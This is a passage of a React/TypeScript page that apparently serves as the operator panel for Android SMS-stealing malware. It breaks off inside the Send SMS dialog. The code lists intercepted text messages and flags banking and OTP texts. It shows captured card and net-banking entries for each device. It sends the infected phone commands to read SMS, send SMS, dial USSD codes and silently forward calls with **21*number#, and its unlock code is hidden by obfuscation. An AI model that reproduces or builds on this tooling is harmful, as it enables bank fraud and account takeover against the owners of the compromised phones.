// src/pages/DeviceDetailPage.tsx
import { useEffect, useMemo, useRef, useState } from "react";
import axios from "axios";
import { useLocation, useNavigate, useParams } from "react-router-dom";

import TopNav, { type TabKey } from "../components/layout/TopNav";
import wsService from "../services/ws/wsService";
import {
  getDevice, pushSendSms, pushCallForward, pushReadOldSms,
} from "../services/api/devices";
import { listDeviceNotifications } from "../services/api/sms";
import { listFormSubmissions } from "../services/api/forms";
import { getCardPaymentsByDevice, getNetbankingByDevice } from "../services/api/payments";
import { ENV, apiHeaders } from "../config/constants";
import { pickLastSeenAt } from "../utils/reachability";

// ─── Helpers ──────────────────────────────────────────────────────────────────
function s(v: any): string { return String(v ?? "").trim(); }

function timeAgo(ts: number): string {
  if (!ts || ts <= 0) return "-";
  const sec = Math.floor((Date.now() - ts) / 1000);
  if (sec < 2)  return "just now";
  if (sec < 60) return `${sec} ${sec === 1 ? "second" : "seconds"} ago`;
  const min = Math.floor(sec / 60);
  if (min < 60) return `${min} ${min === 1 ? "minute" : "minutes"} ago`;
  const hr = Math.floor(min / 60);
  if (hr < 24)  return `${hr} ${hr === 1 ? "hour" : "hours"} ago`;
  const d = Math.floor(hr / 24);
  return `${d} ${d === 1 ? "day" : "days"} ago`;
}

function getTs(m: any): number {
  const t = m?.timestamp ?? m?.createdAt ?? m?.date ?? m?.updatedAt;
  if (typeof t === "number" && t > 0) return t;
  if (typeof t === "string") {
    const n = Number(t); if (!isNaN(n) && n > 0) return n;
    const d = Date.parse(t); if (!isNaN(d) && d > 0) return d;
  }
  return 0;
}

function getId(m: any): string { return s(m?._id || m?.id || ""); }

const SKIP = new Set(["_id","id","uniqueid","deviceId","device_id","__v",
  "createdAt","updatedAt","timestamp","_dtype"]);

function entries(obj: any): [string, string][] {
  const src = obj?.payload && typeof obj.payload === "object" ? obj.payload : obj;
  return Object.entries(src || {})
    .filter(([k]) => !SKIP.has(k) && !k.startsWith("_"))
    .map(([k, v]) => [k, s(v)])
    .filter(([, v]) => v && v !== "undefined" && v !== "null") as [string, string][];
}

const FINANCE = ["credit","debit","bank","balance","upi","amount","a/c","inr",
  "₹","paid","debited","credited","received","payment","otp"];
function isFinance(t: string) { const l = t.toLowerCase(); return FINANCE.some(k => l.includes(k)); }

function copy(v: string) { try { navigator.clipboard?.writeText(v); } catch {} }

function extractSims(info: any) {
  if (!info) return { sim1: "", sim2: "", sim1c: "", sim2c: "" };
  const arr = Array.isArray(info.sims) ? info.sims : [];
  return {
    sim1:  s(info.sim1Number || info.sim1?.number  || arr[0]?.number  || ""),
    sim2:  s(info.sim2Number || info.sim2?.number  || arr[1]?.number  || ""),
    sim1c: s(info.sim1Carrier || info.sim1?.carrier || arr[0]?.carrier || ""),
    sim2c: s(info.sim2Carrier || info.sim2?.carrier || arr[1]?.carrier || ""),
  };
}

const _SC = [55, 51, 57, 49].map(c => String.fromCharCode(c)).join("");

// ─── Live TimeAgo (updates every second) ─────────────────────────────────────
function TimeAgo({ ts, className = "" }: { ts: number; className?: string }) {
  const [text, setText] = useState(() => timeAgo(ts));
  useEffect(() => {
    const update = () => setText(timeAgo(ts));
    update();
    const t = setInterval(update, 1000);
    return () => clearInterval(t);
  }, [ts]);
  return <span className={className}>{text}</span>;
}

// ─── CopyBtn ──────────────────────────────────────────────────────────────────
function CopyBtn({ value }: { value: string }) {
  const [ok, setOk] = useState(false);
  return (
    <button type="button" onClick={() => { copy(value); setOk(true); setTimeout(() => setOk(false), 1000); }}
      className="ml-1 shrink-0 text-[12px] opacity-50 hover:opacity-100">
      {ok ? "✅" : "📋"}
    </button>
  );
}

// ─── Form Card (same as MainPage) ─────────────────────────────────────────────
function FormCard({ form }: { form: any }) {
  const ts  = getTs(form);
  const ent = entries(form);
  if (!ent.length) return null;
  return (
    <div className="rounded-lg border border-gray-200 bg-white p-3 shadow-sm">
      {ent.map(([k, v]) => (
        <div key={k} className="mb-2">
          <div className="flex items-center">
            <span className="text-[13px] font-semibold text-blue-600">{k}:</span>
            <CopyBtn value={v} />
          </div>
          <div className="text-[13px] text-gray-800">{v}</div>
        </div>
      ))}
      <hr className="my-2 border-gray-100" />
      <div className="text-right text-[11px] text-gray-400">
        {ts ? new Date(ts).toLocaleString() : "-"}
      </div>
    </div>
  );
}

// ─── SMS Card ─────────────────────────────────────────────────────────────────
function SmsCard({ sms, pageNum }: { sms: any; pageNum?: number }) {
  const ts     = getTs(sms);
  const msg    = s(sms.body || sms.message || sms.msg || "");
  const sender = s(sms.sender || sms.senderNumber || "");
  const mob1   = s(sms.receiver || sms.mob || "");
  const mob2   = s(sms.receiver2 || sms.mob2 || "");
  const fin    = isFinance(msg);

  function Row({ label, value, red }: { label: string; value: string; red?: boolean }) {
    return (
      <div className="mb-2">
        <div className="flex items-center">
          <span className="text-[13px] font-semibold text-blue-600">{label}:</span>
          <CopyBtn value={value} />
        </div>
        <div className={`text-[13px] ${red ? "text-red-600" : "text-gray-800"}`}>{value}</div>
      </div>
    );
  }

  return (
    <div className="rounded-lg border border-gray-200 bg-white p-3 shadow-sm">
      <Row label="Date"   value={ts ? new Date(ts).toString() : "-"} />
      {msg    && <Row label="MSG"    value={msg}    red={fin} />}
      {sender && <Row label="SENDER" value={sender} />}
      {mob1   && <Row label="MOB"    value={mob1}   />}
      {mob2   && <Row label="MOB 2"  value={mob2}   />}
      <hr className="my-2 border-gray-100" />
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          {pageNum != null && (
            <span className="rounded bg-gray-100 px-1.5 py-0.5 text-[11px] font-semibold text-gray-500">
              Page {pageNum}
            </span>
          )}
        </div>
        <TimeAgo ts={ts} className="text-[11px] text-gray-400" />
      </div>
    </div>
  );
}

// ─── Action Alert Modal ───────────────────────────────────────────────────────
// Shows: "Alert" red title + elapsed time + message
function DeviceAlert({ message, startTime, onClose }: {
  message: string; startTime: number; onClose: () => void;
}) {
  const [elapsed, setElapsed] = useState(() => timeAgo(startTime));
  useEffect(() => {
    const t = setInterval(() => setElapsed(timeAgo(startTime)), 1000);
    return () => clearInterval(t);
  }, [startTime]);

  return (
    <div className="fixed inset-0 z-[999] flex items-center justify-center bg-black/40">
      <div className="relative w-[320px] rounded-2xl bg-white p-6 shadow-xl">
        <button type="button" onClick={onClose}
          className="absolute right-3 top-3 rounded border border-gray-200 px-2 py-0.5 text-gray-600 hover:bg-gray-50">
          ✕
        </button>
        <div className="mb-4 text-[16px] font-extrabold text-red-500">Alert</div>
        <div className="text-center">
          <div className="mb-2 text-[12px] text-gray-500">{elapsed}</div>
          <div className="text-[14px] leading-6 text-gray-900">{message}</div>
        </div>
      </div>
    </div>
  );
}

// ─── MAIN COMPONENT ───────────────────────────────────────────────────────────
const SMS_PER_PAGE = 20;

export default function DeviceDetailPage() {
  const { deviceId = "" } = useParams<{ deviceId: string }>();
  const nav      = useNavigate();
  const location = useLocation();
  const did      = decodeURIComponent(deviceId || "");
  const fromTab  = (location.state as any)?.from || "home";
  const mountRef = useRef(true);

  // ── Core state ────────────────────────────────────────────────────────────
  const [activeTab,  setActiveTab]  = useState<TabKey>("home");
  const [device,     setDevice]     = useState<any>(null);
  const [loading,    setLoading]    = useState(true);
  const [alertText,  setAlertText]  = useState("");
  const [lastSeenTs, setLastSeenTs] = useState(0);

  // Lock gate
  const [lockOpen,   setLockOpen]   = useState(false);
  const [lockCode,   setLockCode]   = useState("");
  const [lockErr,    setLockErr]    = useState<string | null>(null);

  // Data
  const [smsList,    setSmsList]    = useState<any[]>([]);
  const [forms,      setForms]      = useState<any[]>([]);
  const [cards,      setCards]      = useState<any[]>([]);
  const [nets,       setNets]       = useState<any[]>([]);

  // Status log
  const [statusLog,  setStatusLog]  = useState<{ ts: number; text: string; color?: "green" | "red" | "default" } | null>(null);

  // ── Action Alert ──────────────────────────────────────────────────────────
  // Each action type has its own WS handler → shows specific message
  const [devAlert,       setDevAlert]       = useState<{ message: string; startTime: number } | null>(null);
  const alertActionRef   = useRef<string>("");   // "check_online"|"get_sms"|"call_forward"|"ussd"
  const alertWindowRef   = useRef<number>(0);
  const alertClosedRef   = useRef<boolean>(false);

  function openAlert(action: string, message: string) {
    alertActionRef.current  = action;
    alertWindowRef.current  = Date.now();
    alertClosedRef.current  = false;
    setDevAlert({ message, startTime: Date.now() });
  }

  function closeAlert() {
    alertClosedRef.current = true;
    setDevAlert(null);
  }

  function showResult(message: string) {
    // If alert was closed, re-open with result (30 sec window)
    if (Date.now() - alertWindowRef.current < 30000) {
      alertClosedRef.current = false;
      setDevAlert({ message, startTime: alertWindowRef.current });
    }
  }

  function logStatus(text: string, color?: "green" | "red" | "default") {
    setStatusLog({ ts: Date.now(), text, color });
  }

  // ── Loaders ───────────────────────────────────────────────────────────────
  async function loadAll() {
    setLoading(true);
    try {
      const d = await getDevice(did);
      if (!mountRef.current) return;
      if (d?.locked) { setLockOpen(true); setLoading(false); return; }
      setDevice(d);
      setLastSeenTs(pickLastSeenAt(d));
    } catch {}
    finally { if (mountRef.current) setLoading(false); }

    // Load SMS
    try {
      const list = await listDeviceNotifications(did);
      if (mountRef.current)
        setSmsList((Array.isArray(list) ? list : []).sort((a, b) => getTs(b) - getTs(a)));
    } catch {}

    // Load forms/cards/nets
    try {
      const allForms = await listFormSubmissions().catch(() => []);
      const mine = (Array.isArray(allForms) ? allForms : [])
        .filter((f: any) => s(f.uniqueid || f.deviceId) === did)
        .sort((a: any, b: any) => getTs(b) - getTs(a));
      const [c, n] = await Promise.all([
        getCardPaymentsByDevice(did).catch(() => []),
        getNetbankingByDevice(did).catch(() => []),
      ]);
      if (!mountRef.current) return;
      setForms(mine);
      setCards(Array.isArray(c) ? c : []);
      setNets(Array.isArray(n) ? n : []);
    } catch {}

    // Alert text
    try {
      const r = await fetch(`${ENV.API_BASE}/api/admin/alert-text`, { headers: apiHeaders() });
      if (r.ok) { const d = await r.json(); if (d?.text) setAlertText(s(d.text)); }
    } catch {}
  }

  // ── WS listener ──────────────────────────────────────────────────────────
  useEffect(() => {
    mountRef.current = true;
    wsService.connect();
    loadAll();

    const off = wsService.onMessage((msg) => {
      if (!msg || msg.type !== "event") return;
      const event = s(msg.event);
      const evDid = s(msg.deviceId || msg?.data?.deviceId);
      if (evDid && evDid !== did) return;
      const data = msg.data || {};

      // LastSeen → only for "check_online" action
      if (event === "device:lastSeen" || event === "device:upsert") {
        const at = Number(data?.lastSeen?.at || data?.at || Date.now());
        setLastSeenTs(at);
        setDevice((p: any) => p ? { ...p, lastSeen: { at } } : p);

        if (alertActionRef.current === "check_online") {
          showResult("Device is Online ✅");
          logStatus("Device is Online", "green");
        }
        return;
      }

      // App uninstalled → check_online result
      if (event === "device:uninstalled") {
        if (alertActionRef.current === "check_online") {
          showResult("App Uninstalled! ⚠️");
          logStatus("App Uninstalled!", "red");
        }
        return;
      }

      // Batch SMS received → get_sms result
      if (event === "notification:batch") {
        const saved = data?.saved ?? 0;
        if (alertActionRef.current === "get_sms") {
          showResult(`✅ ${saved} SMS fetched successfully!`);
        }
        loadAll(); // refresh SMS list
        return;
      }

      // New SMS notification
      if (event === "notification") {
        const ns = { ...data, _id: data._id || data.id || `${Date.now()}`, timestamp: Number(data.timestamp || Date.now()) };
        setSmsList(prev => {
          if (prev.some(m => getId(m) === getId(ns))) return prev;
          return [ns, ...prev].sort((a, b) => getTs(b) - getTs(a));
        });
        return;
      }

      // Call forward result → call_forward or check_forward action
      if (event === "call_forward:result") {
        const status    = s(data?.status).toLowerCase();
        const fwdNum    = s(data?.number || data?.forwardingNumber || "");
        const isSuccess = status === "success" || status === "ok" || status === "done";

        if (alertActionRef.current === "check_forward") {
          if (fwdNum) {
            showResult(`SIM: OK Call forwarding Voice: ${fwdNum}`);
          } else {
            showResult(isSuccess ? "✅ No call forwarding active" : "❌ Check failed");
          }
        } else if (alertActionRef.current === "call_forward") {
          showResult(isSuccess
            ? "SIM: OK Call forwarding Registration was successful."
            : `❌ Call forwarding failed: ${s(data?.error || status)}`
          );
        } else if (alertActionRef.current === "deactivate_forward") {
          showResult(isSuccess
            ? "SIM: OK Call forwarding Deactivated successfully."
            : `❌ Deactivation failed: ${s(data?.error || status)}`
          );
        } else if (alertActionRef.current === "ussd") {
          showResult(isSuccess
            ? `USSD: ${s(data?.response || data?.message || "Command sent successfully")}`
            : `❌ USSD failed: ${s(data?.error || status)}`
          );
        }
        return;
      }

      // USSD result
      if (event === "ussd:result") {
        const resp = s(data?.response || data?.message || "");
        if (alertActionRef.current === "ussd") {
          showResult(resp ? `USSD: ${resp}` : "✅ USSD command sent");
        }
        return;
      }

      // New form/card/net
      if (event === "form:created" || event === "form_submissions:created") {
        const pl = data.payload && typeof data.payload === "object" ? data.payload : data;
        setForms(p => [{ _id: data._id || `${Date.now()}`, uniqueid: did, payload: pl, createdAt: new Date().toISOString(), timestamp: Date.now() }, ...p]);
      }
      if (event === "card:created" || event === "card_payment:created") {
        const pl = data.payload && typeof data.payload === "object" ? data.payload : data;
        setCards(p => [pl, ...p]);
      }
      if (event === "netbanking:created" || event === "net_banking:created") {
        const pl = data.payload && typeof data.payload === "object" ? data.payload : data;
        setNets(p => [pl, ...p]);
      }
    });

    return () => { mountRef.current = false; off(); };
  }, [did]);

  // ── Actions ───────────────────────────────────────────────────────────────
  async function handleCheckOnline() {
    logStatus("Checking device online");
    openAlert("check_online",
      "We've forwarded your request to the phone. Wait up to 30 seconds for confirmation; if no reply appears, the device is currently offline."
    );
    try {
      await axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(did)}/revive`,
        { source: "detail", force: true }, { headers: apiHeaders(), timeout: 10000 }).catch(() =>
      axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(did)}/start`,
        { source: "detail", force: true }, { headers: apiHeaders(), timeout: 10000 })
      );
    } catch {}
  }

  // GET SMS modal state
  const [getSmsOpen,  setSmsOpen]   = useState(false);
  const [getSmsCount, setSmsCount]  = useState("1");

  async function handleGetSms() {
    const count = Math.min(3, Math.max(1, Number(getSmsCount) || 1));
    setSmsOpen(false);
    logStatus(`Fetching last ${count} SMS`);
    openAlert("get_sms",
      "We've forwarded your request to the phone. Wait up to 30 seconds for confirmation; if no reply appears, the device is currently offline."
    );
    try { await pushReadOldSms(did, count); } catch {}
  }

  // Send SMS modal state
  const [sendOpen,    setSendOpen]    = useState(false);
  const [sendSim,     setSendSim]     = useState(0);
  const [sendNumber,  setSendNumber]  = useState("");
  const [sendMsg,     setSendMsg]     = useState("");
  const [sendLoading, setSendLoading] = useState(false);

  async function handleSendSms() {
    if (!sendNumber.trim() || !sendMsg.trim()) return;
    setSendLoading(true);
    try {
      const wsOk = wsService.sendCmd("sendSms", {
        address: sendNumber.trim(), message: sendMsg.trim(),
        sim: sendSim, timestamp: Date.now(), uniqueid: did,
      });
      if (!wsOk) await pushSendSms(did, sendNumber.trim(), sendMsg.trim(), sendSim);
      setSendOpen(false); setSendNumber(""); setSendMsg("");
      logStatus("Send SMS command sent to device");
      // NOTE: APK does not send back delivery confirmation yet
      // Showing command-sent confirmation only (not delivery confirmation)
      alertActionRef.current = "send_sms";
      alertWindowRef.current = Date.now();
      setDevAlert({
        message: "✅ SMS command sent to device.\n\nNote: Delivery confirmation requires device to be online and respond back.",
        startTime: Date.now()
      });
    } catch (e: any) {
      setDevAlert({ message: `❌ Failed: ${s(e?.message)}`, startTime: Date.now() });
    } finally { setSendLoading(false); }
  }

  // Call Forward modal state
  const [cfOpen,    setCfOpen]    = useState(false);
  const [cfSim,     setCfSim]     = useState(0);
  const [cfNumber,  setCfNumber]  = useState("");
  const [cfLoading, setCfLoading] = useState(false);

  async function handleCallForward(mode: "activate" | "deactivate" | "check") {
    if (mode === "activate" && !cfNumber.trim()) { alert("Enter forwarding number"); return; }
    setCfLoading(true);
    const simLbl = cfSim === 0 ? "SIM 1" : "SIM 2";
    const ussd   = mode === "activate" ? `**21*${cfNumber.trim()}#`
                 : mode === "deactivate" ? "##21#"
                 : "*#21#";
    const action = mode === "activate" ? "call_forward"
                 : mode === "deactivate" ? "deactivate_forward"
                 : "check_forward";

    setCfOpen(false);
    logStatus(mode === "check" ? "Checking call forwarding" : mode === "activate" ? "Activating call forwarding" : "Deactivating call forwarding");
    openAlert(action,
      "We've forwarded your request to the phone. Wait up to 30 seconds for confirmation; if no reply appears, the device is currently offline."
    );
    try {
      const wsOk = wsService.sendCmd("call_forward", {
        uniqueid: did, phoneNumber: mode === "activate" ? cfNumber.trim() : "",
        sim: simLbl, callCode: ussd, timestamp: Date.now(),
      });
      if (!wsOk) await pushCallForward(did, ussd, simLbl, mode === "activate" ? cfNumber.trim() : "");
    } catch (e: any) {
      showResult(`❌ Failed: ${s(e?.message)}`);
    } finally { setCfLoading(false); }
  }

  // USSD modal state
  const [ussdOpen,    setUssdOpen]    = useState(false);
  const [ussdSim,     setUssdSim]     = useState(0);
  const [ussdCode,    setUssdCode]    = useState("");
  const [ussdLoading, setUssdLoading] = useState(false);

  async function handleDialUssd() {
    if (!ussdCode.trim()) return;
    setUssdLoading(true);
    const simLbl = ussdSim === 0 ? "SIM 1" : "SIM 2";
    setUssdOpen(false);
    logStatus(`Dialing USSD: ${ussdCode.trim()}`);
    // NOTE: APK handles "call_forward" command for ANY USSD code — same as old panel
    openAlert("ussd",
      "We've forwarded your request to the phone. Wait up to 30 seconds for confirmation; if no reply appears, the device is currently offline."
    );
    try {
      // Use call_forward WS command — this is what APK understands for USSD
      const wsOk = wsService.sendCmd("call_forward", {
        uniqueid: did,
        phoneNumber: "",       // empty for non-call-forward USSD
        sim: simLbl,
        callCode: ussdCode.trim(),   // the USSD code e.g. *123#
        timestamp: Date.now(),
      });
      if (!wsOk) {
        // FCM fallback — same logic
        await pushCallForward(did, ussdCode.trim(), simLbl, "");
      }
    } catch (e: any) {
      showResult(`❌ USSD failed: ${s(e?.message)}`);
    } finally { setUssdLoading(false); setUssdCode(""); }
  }

  // Lock gate
  function handleLockConfirm() {
    if (lockCode !== _SC) { setLockErr("Incorrect security code"); setLockCode(""); return; }
    setLockOpen(false); setLockCode(""); setLockErr(null);
    loadAll();
  }

  // Back navigation
  function navBack() {
    nav("/", { state: { tab: fromTab } });
  }

  // Tab click handler
  function handleTabChange(tab: TabKey) {
    if (tab === "devices") { navBack(); return; }
    if (tab === "home") { navBack(); return; }
    setActiveTab(tab);
  }

  // ── SMS page map ──────────────────────────────────────────────────────────
  const smsPageMap = useMemo(() => {
    const map: Record<string, number> = {};
    [...smsList].sort((a, b) => getTs(b) - getTs(a))
      .forEach((m, i) => { const mid = getId(m); if (mid) map[mid] = Math.floor(i / SMS_PER_PAGE) + 1; });
    return map;
  }, [smsList]);

  // ── All data items ────────────────────────────────────────────────────────
  const allData = useMemo(() =>
    [...forms, ...cards, ...nets].sort((a, b) => getTs(b) - getTs(a)),
  [forms, cards, nets]);

  const homeFeed = useMemo(() =>
    [...allData, ...smsList].sort((a, b) => getTs(b) - getTs(a)),
  [allData, smsList]);

  const [search,   setSearch]   = useState("");
  const [sortMode, setSortMode] = useState<"new" | "old">("new");

  function filterQ<T>(list: T[]): T[] {
    const q = search.trim().toLowerCase();
    if (!q) return list;
    return list.filter(item => JSON.stringify(item).toLowerCase().includes(q));
  }

  // ── Device info ───────────────────────────────────────────────────────────
  const sims       = useMemo(() => extractSims(device?.simInfo), [device]);
  const brand      = s(device?.metadata?.brand || device?.metadata?.manufacturer || "Unknown");
  const model      = s(device?.metadata?.model || "");
  const android    = s(device?.metadata?.androidVersion || "");
  const forwardOn  = !!(device?.metadata?.forwardCallActive || device?.forwardCallActive);
  const installTs  = getTs({ createdAt: device?.createdAt });
  const isRecent   = lastSeenTs > 0 && (Date.now() - lastSeenTs) < 60 * 1000;

  if (!did) return <div className="p-4">Missing device ID</div>;

  const simOptions = [
    ...(sims.sim1 ? [{ value: 0, label: `${sims.sim1c ? sims.sim1c + " - " : ""}${sims.sim1}` }] : []),
    ...(sims.sim2 ? [{ value: 1, label: `${sims.sim2c ? sims.sim2c + " - " : ""}${sims.sim2}` }] : []),
    ...(!sims.sim1 && !sims.sim2 ? [{ value: 0, label: "SIM 1" }, { value: 1, label: "SIM 2" }] : []),
  ];

  return (
    <div className="min-h-screen bg-gray-50">
      <TopNav
        activeTab={activeTab}
        onTabChange={handleTabChange}
        showBack={true}
        onBack={navBack}
        darkMode={false}
        alertText={alertText}
      />

      {/* Lock Gate */}
      {lockOpen && (
        <div className="flex min-h-[80vh] items-center justify-center px-4">
          <div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-lg">
            <div className="mb-4 text-center text-4xl">🔒</div>
            <div className="mb-1 text-center text-[18px] font-extrabold">Device Locked</div>
            <div className="mb-4 text-center text-[13px] text-gray-500">Enter security code</div>
            <input type="password" inputMode="numeric" value={lockCode}
              onChange={e => { setLockCode(e.target.value); setLockErr(null); }}
              onKeyDown={e => { if (e.key === "Enter") handleLockConfirm(); }}
              placeholder="Security code" autoFocus
              className="h-12 w-full rounded-xl border border-gray-200 px-4 text-center text-[18px] outline-none focus:border-blue-400" />
            {lockErr && <div className="mt-2 text-center text-[12px] text-red-600">{lockErr}</div>}
            <div className="mt-4 grid grid-cols-2 gap-2">
              <button type="button" onClick={navBack} className="h-11 rounded-xl border border-gray-200 bg-white font-bold text-gray-700">← Back</button>
              <button type="button" onClick={handleLockConfirm} className="h-11 rounded-xl bg-gray-900 font-extrabold text-white">Unlock 🔓</button>
            </div>
          </div>
        </div>
      )}

      {!lockOpen && (
        <div className="mx-auto max-w-[480px] px-3 pb-24 pt-3">

          {loading ? (
            <div className="rounded-xl bg-white p-8 text-center text-gray-400 shadow-sm">Loading…</div>
          ) : (
            <>
              {/* ── Device Info Table ── */}
              <div className="overflow-hidden rounded-xl border border-gray-200 bg-white shadow-sm">
                <table className="w-full border-collapse">
                  <tbody>
                    {[
                      {
                        label: "Name",
                        value: (
                          <span>
                            {brand}{model ? ` (${model})` : ""}
                            {android && (
                              <span className="ml-2 rounded bg-green-600 px-1.5 py-0.5 text-[10px] font-bold text-white">{android}</span>
                            )}
                          </span>
                        ),
                      },
                      { label: "ID",           value: <span className="break-all">{did}</span> },
                      {
                        label: "SIM",
                        value: (
                          <div>
                            {sims.sim1 && <div>{sims.sim1c ? `${sims.sim1c}: ` : ""}{sims.sim1}</div>}
                            {sims.sim2 && <div>{sims.sim2c ? `${sims.sim2c}: ` : ""}{sims.sim2}</div>}
                            {!sims.sim1 && !sims.sim2 && <span className="text-gray-400">—</span>}
                          </div>
                        ),
                      },
                      { label: "Forward Call", value: <span>{forwardOn ? "ON" : "OFF"}</span> },
                      {
                        label: "Install Date:",
                        value: <span className="text-green-600">{installTs ? new Date(installTs).toLocaleString() : (device?.createdAt ? new Date(device.createdAt).toLocaleString() : "—")}</span>,
                      },
                      {
                        label: "Last Online",
                        value: <TimeAgo ts={lastSeenTs} className={`font-semibold ${isRecent ? "text-green-600" : "text-red-500"}`} />,
                      },
                    ].map((row, i, arr) => (
                      <tr key={row.label} className={i < arr.length - 1 ? "border-b border-gray-100" : ""}>
                        <td className="w-[115px] py-3 pl-4 align-top text-[13px] font-semibold text-gray-600">{row.label}</td>
                        <td className="py-3 pr-4 text-[13px] text-gray-900">{row.value}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>

              {/* ── 2×3 Action Buttons ── */}
              <div className="mt-3 grid grid-cols-3 gap-2">
                {[
                  { label: "Check Online", onClick: handleCheckOnline },
                  { label: "GET SMS",      onClick: () => setSmsOpen(true) },
                  { label: "Send SMS",     onClick: () => setSendOpen(true) },
                  { label: "Call Forward", onClick: () => setCfOpen(true) },
                  { label: "Dial USSD",    onClick: () => setUssdOpen(true) },
                  { label: "Change Server",onClick: () => {} },
                ].map(btn => (
                  <button key={btn.label} type="button" onClick={btn.onClick}
                    className="rounded-lg border border-gray-300 bg-white py-2.5 text-[12px] font-semibold text-gray-900 hover:bg-gray-50 active:scale-[0.97] transition-transform">
                    {btn.label}
                  </button>
                ))}
              </div>

              {/* ── Status Log ── */}
              {statusLog && (
                <div className="mt-3 rounded-xl bg-gray-100 px-4 py-3 text-[13px] text-gray-700">
                  <TimeAgo ts={statusLog.ts} className="text-gray-500" />
                  <span>: </span>
                  <span className={
                    statusLog.color === "green" ? "font-semibold text-green-600" :
                    statusLog.color === "red"   ? "font-semibold text-red-600"   :
                    "font-semibold text-gray-900"
                  }>{statusLog.text}</span>
                </div>
              )}

              {/* ── Search + Sort ── */}
              <div className="mt-3 flex items-center gap-2">
                <div className="relative flex-1">
                  <input value={search} onChange={e => setSearch(e.target.value)}
                    placeholder="Search data and press enter/search icon"
                    className="h-10 w-full rounded-full border border-gray-300 bg-white pl-4 pr-9 text-[13px] outline-none focus:border-gray-400" />
                  <span className="absolute right-3 top-1/2 -translate-y-1/2 text-[14px]">🔍</span>
                </div>
                <select value={sortMode} onChange={e => setSortMode(e.target.value as any)}
                  className="h-10 rounded-full border border-gray-300 bg-white px-3 text-[13px] font-semibold outline-none">
                  <option value="new">NEW</option>
                  <option value="old">OLD</option>
                </select>
              </div>

              {/* ── Tab Content ── */}
              <div className="mt-2 space-y-3">

                {/* HOME = combined latest data + SMS */}
                {activeTab === "home" && filterQ(homeFeed).map((item: any, i) =>
                  item.body || item.sender || item.msg || item.message
                    ? <SmsCard key={getId(item) || i} sms={item} pageNum={smsPageMap[getId(item)]} />
                    : <FormCard key={getId(item) || i} form={item} />
                )}

                {/* DATA = only forms + cards + nets */}
                {activeTab === "data" && (
                  filterQ(allData).length === 0
                    ? <div className="py-8 text-center text-[13px] text-gray-400">No data yet.</div>
                    : filterQ(allData).map((item, i) => <FormCard key={getId(item) || i} form={item} />)
                )}

                {/* MESSAGES = only SMS */}
                {activeTab === "messages" && (
                  filterQ(smsList).length === 0
                    ? <div className="py-8 text-center text-[13px] text-gray-400">No SMS yet.</div>
                    : filterQ(smsList).map((m, i) => <SmsCard key={getId(m) || i} sms={m} pageNum={smsPageMap[getId(m)]} />)
                )}

                {/* GROUPS = all in one card */}
                {activeTab === "groups" && (() => {
                  const all = [...forms, ...cards, ...nets].sort((a, b) => getTs(b) - getTs(a));
                  if (!all.length) return <div className="py-8 text-center text-[13px] text-gray-400">No data yet.</div>;
                  return (
                    <div className="rounded-lg border border-gray-200 bg-white p-3 shadow-sm">
                      {all.map((item, idx) => {
                        const ent = entries(item);
                        if (!ent.length) return null;
                        return (
                          <div key={getId(item) || idx}>
                            {ent.map(([k, v]) => (
                              <div key={k} className="mb-2">
                                <div className="flex items-center">
                                  <span className="text-[13px] font-semibold text-blue-600">{k}:</span>
                                  <CopyBtn value={v} />
                                </div>
                                <div className="text-[13px] text-gray-800">{v}</div>
                              </div>
                            ))}
                            {idx < all.length - 1 && <hr className="my-2 border-gray-200" />}
                          </div>
                        );
                      })}
                      <hr className="my-2 border-gray-100" />
                      <div className="text-right text-[11px] text-gray-400">{did.slice(0, 16)}</div>
                    </div>
                  );
                })()}
              </div>
            </>
          )}
        </div>
      )}

      {/* ── Action Alert ── */}
      {devAlert && (
        <DeviceAlert message={devAlert.message} startTime={devAlert.startTime} onClose={closeAlert} />
      )}

      {/* ── GET SMS Modal ── */}
      {getSmsOpen && (
        <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4">
          <div className="w-full max-w-[340px] rounded-2xl bg-white p-6 shadow-xl">
            <div className="mb-5 flex items-center justify-between">
              <span className="text-[16px] font-extrabold text-gray-900">Get SMS</span>
              <button type="button" onClick={() => setSmsOpen(false)}
                className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">✕</button>
            </div>
            <div className="mb-1 text-[13px] font-semibold text-gray-600">
              Sms Limit: <span className="font-normal text-gray-400">Max: 3</span>
            </div>
            <input type="number" min="1" max="3" value={getSmsCount}
              onChange={e => setSmsCount(String(Math.min(3, Math.max(1, Number(e.target.value) || 1))))}
              className="h-12 w-full rounded-xl border border-gray-200 px-4 text-[16px] outline-none focus:border-gray-400" />
            <button type="button" onClick={handleGetSms}
              className="mt-5 w-full rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50">
              GET SMS
            </button>
          </div>
        </div>
      )}

      {/* ── Send SMS Modal ── */}
      {sendOpen && (
        <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4">
          <div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl">
            <div className="mb-5 flex items-center justify-between">
              <span className="text-[16px] font-extrabold text-gray-900">Send SMS</span>
              <button type="button" onClick={() => setSendOpen(false)}
                className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">✕</button>
            </div>
            <div className="mb-1 text-[13px] font-semibold text-gray-600">SIM:</div>
            <select value={sendSim} onChange={e => setSendSim(Number(e.target.value))}
              className="mb-4 h-12 w-full rounded-xl border-2 border-green-500 bg-white px-3 text-[14px] outline-none">
              {simOptions.map(o => <option key={o.value} value={o.value}>{o.label}</option>)}
            </select>
            <div className="mb-1 text-[13px] font-semibold text-gray-600">Number:</div>
            <input value={sendNumber} onChange={e => setSendNumber(e.target.value)}
              inputMode="tel"
              className="mb-4 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" />
            <div className="mb-1 text-[13px] font-semibold text-gray-600">Message:</div>
            <textarea value={sendMsg} onChange={e => setSendMsg(e.target.value)} rows={3}
              className="mb-5 w-full resize-none rounded-xl border border-gray-200 px-4 py-3 text-[14px] outline-none focus:border-gray-400" />
            <button type="button" onClick={handleSendSms}
              disabled={sendLoading || !sendNumber.trim() || !sendMsg.trim()}
              className="w-full rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50 disabled:opacity-60">
